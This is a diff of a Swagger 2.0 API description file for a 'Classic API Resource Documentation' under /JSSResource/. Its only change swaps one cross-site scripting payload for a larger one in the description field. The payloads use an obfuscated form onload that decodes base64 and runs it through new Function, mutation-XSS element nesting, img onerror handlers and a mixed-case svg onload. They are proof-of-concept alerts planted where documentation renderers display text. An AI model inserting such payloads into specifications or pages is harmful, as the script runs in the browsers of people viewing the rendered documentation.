@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form onload="(a=atob,b="YWxlcnQoMSk=",c=new Function(a(b)),c())"><math><mtext></form><form><mglyph><svg><mtext><textarea id=2><path id=</textarea><img onerror=alert('textarea') src=1>></path></mtext></svg></mglyph></textarea></form>
+    <form onload="(a=atob,b="YWxlcnQoMSk=",c=new Function(a(b)),c())"><math><mtext></form><form onload="(a=atob,b="YWxlcnQoMSk=",c=new Function(a(b)),c())"><mglyph><svg><mtext><textarea id=2><path id=</textarea><img onerror=alert('textarea') src=1>></path></mtext></svg></mglyph></textarea><img onerrOr=x src=1><svg/OnLy=1 OnLoAd=AlerT`1`// </form>
 
   version: production
 basePath: /JSSResource/
